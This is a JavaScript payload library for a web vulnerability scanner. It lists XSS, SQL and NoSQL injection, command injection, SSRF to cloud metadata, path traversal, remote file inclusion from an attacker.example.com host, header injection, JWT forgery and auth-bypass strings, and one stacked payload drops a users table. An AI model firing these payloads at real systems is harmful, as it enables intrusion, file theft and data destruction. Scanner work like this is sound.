/**
 * 🎯 PayloadService — Generates context-aware payloads for 15+ vulnerability families.
 *
 * Each payload carries metadata:
 *   { family, payload, marker, technique, encoding, expects }
 * - family    : vuln family (XSS, SQLI, NOSQLI, CMDI, SSRF, ...)
 * - payload   : the actual string to inject
 * - marker    : optional unique token expected back in response (reflection check)
 * - technique : sub-technique (error-based, time-based, blind, dom, ...)
 * - encoding  : raw | url | double-url | unicode | base64
 * - expects   : { reflection, sqlError, timeDelay, redirect, statusCode, headerLeak, fileContent }
 *
 * The TestEngine uses `expects` to deterministically confirm true positives.
 */

const crypto = require("crypto");

const MARKER = () => "wsp" + crypto.randomBytes(4).toString("hex");

class PayloadService {
  // ───────────────────────────────────────────────────────────
  // Encodings / mutators
  // ───────────────────────────────────────────────────────────
  static urlEncode(s) { return encodeURIComponent(s); }
  static doubleUrlEncode(s) { return encodeURIComponent(encodeURIComponent(s)); }
  static htmlEncode(s) {
    return s.replace(/[<>"'&]/g, c => `&#${c.charCodeAt(0)};`);
  }
  static unicodeEscape(s) {
    return s.split("").map(c => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("");
  }
  static caseSwap(s) {
    return s.split("").map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join("");
  }
  static base64(s) { return Buffer.from(s).toString("base64"); }

  // Apply mutations to a base payload list, returning expanded set
  static mutate(payloads, encodings = ["raw"]) {
    const out = [];
    for (const p of payloads) {
      for (const enc of encodings) {
        let v = p.payload;
        if (enc === "url") v = this.urlEncode(v);
        else if (enc === "double-url") v = this.doubleUrlEncode(v);
        else if (enc === "unicode") v = this.unicodeEscape(v);
        else if (enc === "case") v = this.caseSwap(v);
        else if (enc === "base64") v = this.base64(v);
        out.push({ ...p, payload: v, encoding: enc });
      }
    }
    return out;
  }

  // ───────────────────────────────────────────────────────────
  // 1) XSS — reflected, attribute, DOM, blind
  // ───────────────────────────────────────────────────────────
  static getXSSPayloads() {
    const m = MARKER();
    return [
      { family: "XSS", technique: "reflected-script", payload: `<script>/*${m}*/alert(1)</script>`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "img-onerror", payload: `<img src=x onerror=alert('${m}')>`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "svg-onload", payload: `<svg/onload=alert('${m}')>`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "attr-break", payload: `"><script>alert('${m}')</script>`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "javascript-uri", payload: `javascript:alert('${m}')`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "iframe-srcdoc", payload: `<iframe srcdoc="<script>alert('${m}')</script>">`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "html-entity-bypass", payload: `<scr<script>ipt>alert('${m}')</scr</script>ipt>`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "event-handler", payload: `' onfocus=alert('${m}') autofocus '`, marker: m, expects: { reflection: true } },
      { family: "XSS", technique: "polyglot", payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert('${m}'))//`, marker: m, expects: { reflection: true } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 2) SQL Injection — error, boolean, union, time
  // ───────────────────────────────────────────────────────────
  static getSQLiPayloads() {
    return [
      { family: "SQLI", technique: "error-quote", payload: `'`, expects: { sqlError: true } },
      { family: "SQLI", technique: "error-double", payload: `"`, expects: { sqlError: true } },
      { family: "SQLI", technique: "boolean-true", payload: `' OR '1'='1`, expects: { sqlError: true, statusCode: 200 } },
      { family: "SQLI", technique: "boolean-comment", payload: `' OR 1=1-- -`, expects: { sqlError: true, statusCode: 200 } },
      { family: "SQLI", technique: "union-null", payload: `' UNION SELECT NULL,NULL,NULL-- -`, expects: { sqlError: true } },
      { family: "SQLI", technique: "stacked", payload: `'; DROP TABLE users-- -`, expects: { sqlError: true } },
      { family: "SQLI", technique: "time-mysql", payload: `' OR SLEEP(5)-- -`, expects: { timeDelay: 4500 } },
      { family: "SQLI", technique: "time-postgres", payload: `'; SELECT pg_sleep(5)-- -`, expects: { timeDelay: 4500 } },
      { family: "SQLI", technique: "time-mssql", payload: `'; WAITFOR DELAY '0:0:5'-- -`, expects: { timeDelay: 4500 } },
      { family: "SQLI", technique: "admin-bypass", payload: `admin'-- -`, expects: { statusCode: 200 } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 3) NoSQL Injection (MongoDB)
  // ───────────────────────────────────────────────────────────
  static getNoSQLiPayloads() {
    return [
      { family: "NOSQLI", technique: "operator-ne", payload: `{"$ne": null}`, json: true, expects: { statusCode: 200 } },
      { family: "NOSQLI", technique: "operator-gt", payload: `{"$gt": ""}`, json: true, expects: { statusCode: 200 } },
      { family: "NOSQLI", technique: "operator-regex", payload: `{"$regex": ".*"}`, json: true, expects: { statusCode: 200 } },
      { family: "NOSQLI", technique: "where-js", payload: `{"$where": "sleep(5000)"}`, json: true, expects: { timeDelay: 4500 } },
      { family: "NOSQLI", technique: "string-ne", payload: `[$ne]=null`, expects: { statusCode: 200 } },
      { family: "NOSQLI", technique: "auth-bypass", payload: `' || '1'=='1`, expects: { statusCode: 200 } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 4) Command Injection
  // ───────────────────────────────────────────────────────────
  static getCMDiPayloads() {
    const m = MARKER();
    return [
      { family: "CMDI", technique: "semicolon-id", payload: `; id`, marker: "uid=", expects: { reflection: true } },
      { family: "CMDI", technique: "pipe-whoami", payload: `| whoami`, expects: { reflection: false } },
      { family: "CMDI", technique: "backtick", payload: "`id`", marker: "uid=", expects: { reflection: true } },
      { family: "CMDI", technique: "subshell", payload: `$(id)`, marker: "uid=", expects: { reflection: true } },
      { family: "CMDI", technique: "and-cat-passwd", payload: `&& cat /etc/passwd`, marker: "root:x:", expects: { reflection: true, fileContent: "passwd" } },
      { family: "CMDI", technique: "windows-dir", payload: `& dir`, expects: { reflection: false } },
      { family: "CMDI", technique: "time-sleep", payload: `; sleep 5`, expects: { timeDelay: 4500 } },
      { family: "CMDI", technique: "time-ping", payload: `& ping -n 5 127.0.0.1`, expects: { timeDelay: 4000 } },
      { family: "CMDI", technique: "echo-marker", payload: `; echo ${m}`, marker: m, expects: { reflection: true } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 5) SSRF
  // ───────────────────────────────────────────────────────────
  static getSSRFPayloads() {
    return [
      { family: "SSRF", technique: "aws-metadata", payload: `http://169.254.169.254/latest/meta-data/`, expects: { reflection: true } },
      { family: "SSRF", technique: "gcp-metadata", payload: `http://metadata.google.internal/computeMetadata/v1/`, expects: { reflection: true } },
      { family: "SSRF", technique: "localhost", payload: `http://127.0.0.1:80/`, expects: { statusCode: 200 } },
      { family: "SSRF", technique: "localhost-alt", payload: `http://localhost:22/`, expects: { reflection: true } },
      { family: "SSRF", technique: "internal-net", payload: `http://10.0.0.1/`, expects: { reflection: false } },
      { family: "SSRF", technique: "file-protocol", payload: `file:///etc/passwd`, marker: "root:x:", expects: { reflection: true, fileContent: "passwd" } },
      { family: "SSRF", technique: "gopher", payload: `gopher://127.0.0.1:6379/_INFO`, expects: { reflection: false } },
      { family: "SSRF", technique: "dns-rebind", payload: `http://spoofed.burpcollaborator.net/`, expects: { reflection: false } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 6) Open Redirect
  // ───────────────────────────────────────────────────────────
  static getOpenRedirectPayloads() {
    return [
      { family: "OPEN_REDIRECT", technique: "absolute", payload: `https://evil.example.com`, expects: { redirect: "evil.example.com" } },
      { family: "OPEN_REDIRECT", technique: "protocol-relative", payload: `//evil.example.com`, expects: { redirect: "evil.example.com" } },
      { family: "OPEN_REDIRECT", technique: "backslash", payload: `/\\evil.example.com`, expects: { redirect: "evil.example.com" } },
      { family: "OPEN_REDIRECT", technique: "at-trick", payload: `https://trusted.com@evil.example.com`, expects: { redirect: "evil.example.com" } },
      { family: "OPEN_REDIRECT", technique: "whitespace", payload: ` //evil.example.com`, expects: { redirect: "evil.example.com" } },
      { family: "OPEN_REDIRECT", technique: "data-uri", payload: `data:text/html,<script>alert(1)</script>`, expects: { redirect: "data:" } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 7) Path Traversal
  // ───────────────────────────────────────────────────────────
  static getPathTraversalPayloads() {
    return [
      { family: "PATH_TRAVERSAL", technique: "unix-passwd", payload: `../../../../etc/passwd`, marker: "root:x:", expects: { fileContent: "passwd", reflection: true } },
      { family: "PATH_TRAVERSAL", technique: "unix-deep", payload: `../../../../../../../../etc/passwd`, marker: "root:x:", expects: { fileContent: "passwd", reflection: true } },
      { family: "PATH_TRAVERSAL", technique: "windows-ini", payload: `..\\..\\..\\..\\windows\\win.ini`, marker: "[fonts]", expects: { fileContent: "win.ini", reflection: true } },
      { family: "PATH_TRAVERSAL", technique: "url-encoded", payload: `..%2f..%2f..%2fetc%2fpasswd`, marker: "root:x:", expects: { reflection: true } },
      { family: "PATH_TRAVERSAL", technique: "double-encoded", payload: `..%252f..%252f..%252fetc%252fpasswd`, marker: "root:x:", expects: { reflection: true } },
      { family: "PATH_TRAVERSAL", technique: "null-byte", payload: `../../../etc/passwd%00.png`, marker: "root:x:", expects: { reflection: true } },
      { family: "PATH_TRAVERSAL", technique: "absolute", payload: `/etc/passwd`, marker: "root:x:", expects: { reflection: true } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 8) LFI / RFI
  // ───────────────────────────────────────────────────────────
  static getFileInclusionPayloads() {
    return [
      { family: "LFI", technique: "php-filter", payload: `php://filter/convert.base64-encode/resource=index.php`, expects: { reflection: true } },
      { family: "LFI", technique: "php-input", payload: `php://input`, expects: { reflection: false } },
      { family: "LFI", technique: "data-wrapper", payload: `data://text/plain,<?php phpinfo();?>`, marker: "phpinfo", expects: { reflection: true } },
      { family: "RFI", technique: "remote-include", payload: `https://attacker.example.com/shell.txt`, expects: { reflection: false } },
      { family: "LFI", technique: "log-poisoning", payload: `/var/log/apache2/access.log`, expects: { reflection: false } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 9) CRLF / Header Injection
  // ───────────────────────────────────────────────────────────
  static getHeaderInjectionPayloads() {
    return [
      { family: "HEADER_INJECTION", technique: "crlf-set-cookie", payload: `test\r\nSet-Cookie: pwn=1`, expects: { headerLeak: "pwn" } },
      { family: "HEADER_INJECTION", technique: "crlf-location", payload: `test\r\nLocation: https://evil.com`, expects: { headerLeak: "evil.com", redirect: "evil.com" } },
      { family: "HEADER_INJECTION", technique: "host-header", payload: `evil.example.com`, asHeader: "Host", expects: { reflection: true } },
      { family: "HEADER_INJECTION", technique: "x-forwarded-host", payload: `evil.example.com`, asHeader: "X-Forwarded-Host", expects: { reflection: true } },
      { family: "HEADER_INJECTION", technique: "encoded-crlf", payload: `test%0d%0aX-Injected: yes`, expects: { headerLeak: "X-Injected" } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 10) Prototype Pollution (JSON body)
  // ───────────────────────────────────────────────────────────
  static getPrototypePollutionPayloads() {
    return [
      { family: "PROTOTYPE_POLLUTION", technique: "proto-direct", payload: `{"__proto__":{"polluted":"yes"}}`, json: true, expects: { reflection: false } },
      { family: "PROTOTYPE_POLLUTION", technique: "constructor", payload: `{"constructor":{"prototype":{"polluted":"yes"}}}`, json: true, expects: { reflection: false } },
      { family: "PROTOTYPE_POLLUTION", technique: "nested-merge", payload: `{"a":{"__proto__":{"isAdmin":true}}}`, json: true, expects: { reflection: false } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 11) JWT attacks
  // ───────────────────────────────────────────────────────────
  static getJWTPayloads() {
    // header.payload.signature — alg=none + admin claim
    const noneJwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.";
    return [
      { family: "JWT", technique: "alg-none", payload: noneJwt, asHeader: "Authorization", prefix: "Bearer ", expects: { statusCode: 200 } },
      { family: "JWT", technique: "weak-secret", payload: "eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.placeholder", asHeader: "Authorization", prefix: "Bearer ", expects: { statusCode: 200 } },
      { family: "JWT", technique: "kid-traversal", payload: "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJhZG1pbiI6dHJ1ZX0.AAAA", asHeader: "Authorization", prefix: "Bearer ", expects: { statusCode: 200 } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 12) Authentication Bypass
  // ───────────────────────────────────────────────────────────
  static getAuthBypassPayloads() {
    return [
      { family: "AUTH_BYPASS", technique: "x-forwarded-for", payload: "127.0.0.1", asHeader: "X-Forwarded-For", expects: { statusCode: 200 } },
      { family: "AUTH_BYPASS", technique: "x-original-url", payload: "/admin", asHeader: "X-Original-URL", expects: { statusCode: 200 } },
      { family: "AUTH_BYPASS", technique: "x-rewrite-url", payload: "/admin", asHeader: "X-Rewrite-URL", expects: { statusCode: 200 } },
      { family: "AUTH_BYPASS", technique: "method-override", payload: "GET", asHeader: "X-HTTP-Method-Override", expects: { statusCode: 200 } },
      { family: "AUTH_BYPASS", technique: "double-slash", payload: "//admin", urlOverride: true, expects: { statusCode: 200 } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 13) CSRF probes (we just observe missing token / SameSite)
  // ───────────────────────────────────────────────────────────
  static getCSRFPayloads() {
    return [
      { family: "CSRF", technique: "no-token", payload: "", probeOnly: true, expects: {} },
      { family: "CSRF", technique: "external-origin", payload: "", asHeader: "Origin", originHeaderValue: "https://evil.example.com", probeOnly: true, expects: {} }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 14) Sensitive Data Exposure (probe paths)
  // ───────────────────────────────────────────────────────────
  static getSensitiveDataPaths() {
    return [
      { family: "SENSITIVE_DATA", technique: "env-file", urlPath: "/.env", expects: { reflection: true } },
      { family: "SENSITIVE_DATA", technique: "git-config", urlPath: "/.git/config", expects: { reflection: true } },
      { family: "SENSITIVE_DATA", technique: "backup", urlPath: "/backup.zip", expects: { statusCode: 200 } },
      { family: "SENSITIVE_DATA", technique: "phpinfo", urlPath: "/phpinfo.php", marker: "phpinfo()", expects: { reflection: true } },
      { family: "SENSITIVE_DATA", technique: "wp-config", urlPath: "/wp-config.php.bak", expects: { statusCode: 200 } },
      { family: "SENSITIVE_DATA", technique: "ds-store", urlPath: "/.DS_Store", expects: { statusCode: 200 } },
      { family: "SENSITIVE_DATA", technique: "swagger", urlPath: "/swagger.json", expects: { reflection: true } },
      { family: "SENSITIVE_DATA", technique: "actuator", urlPath: "/actuator/env", expects: { reflection: true } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // 15) Rate Limiting probe (returns burst directive)
  // ───────────────────────────────────────────────────────────
  static getRateLimitProbe() {
    return [{ family: "RATE_LIMIT", technique: "burst-50", probeOnly: true, burst: 50, expects: { rateLimitMissing: true } }];
  }

  // ───────────────────────────────────────────────────────────
  // 16) IDOR probes (numeric/uuid swap)
  // ───────────────────────────────────────────────────────────
  static getIDORPayloads() {
    return [
      { family: "IDOR", technique: "num-decrement", payload: "1", expects: { statusCode: 200 } },
      { family: "IDOR", technique: "num-increment", payload: "999999", expects: { statusCode: 200 } },
      { family: "IDOR", technique: "negative", payload: "-1", expects: { statusCode: 200 } },
      { family: "IDOR", technique: "uuid-zero", payload: "00000000-0000-0000-0000-000000000000", expects: { statusCode: 200 } }
    ];
  }

  // ───────────────────────────────────────────────────────────
  // Aggregate selection — by stack/context
  // ───────────────────────────────────────────────────────────
  /**
   * Returns ALL families. Caller can filter.
   */
  static getAll() {
    return [
      ...this.getXSSPayloads(),
      ...this.getSQLiPayloads(),
      ...this.getNoSQLiPayloads(),
      ...this.getCMDiPayloads(),
      ...this.getSSRFPayloads(),
      ...this.getOpenRedirectPayloads(),
      ...this.getPathTraversalPayloads(),
      ...this.getFileInclusionPayloads(),
      ...this.getHeaderInjectionPayloads(),
      ...this.getPrototypePollutionPayloads(),
      ...this.getJWTPayloads(),
      ...this.getAuthBypassPayloads(),
      ...this.getCSRFPayloads(),
      ...this.getIDORPayloads()
    ];
  }

  /**
   * Smart selection adapted to detected stack.
   * @param {Object} ctx { stack, hasJsonApi, hasAuth, hasForms, hasRedirect }
   */
  static selectForContext(ctx = {}) {
    const out = [];
    out.push(...this.getXSSPayloads());
    out.push(...this.getSQLiPayloads());
    if (ctx.hasJsonApi || ctx.stack?.includes("node") || ctx.stack?.includes("mongo")) {
      out.push(...this.getNoSQLiPayloads());
      out.push(...this.getPrototypePollutionPayloads());
    }
    out.push(...this.getCMDiPayloads());
    out.push(...this.getSSRFPayloads());
    out.push(...this.getOpenRedirectPayloads());
    out.push(...this.getPathTraversalPayloads());
    if (ctx.stack?.includes("php")) out.push(...this.getFileInclusionPayloads());
    out.push(...this.getHeaderInjectionPayloads());
    if (ctx.hasAuth) {
      out.push(...this.getJWTPayloads());
      out.push(...this.getAuthBypassPayloads());
    }
    out.push(...this.getIDORPayloads());
    return out;
  }
}

module.exports = PayloadService;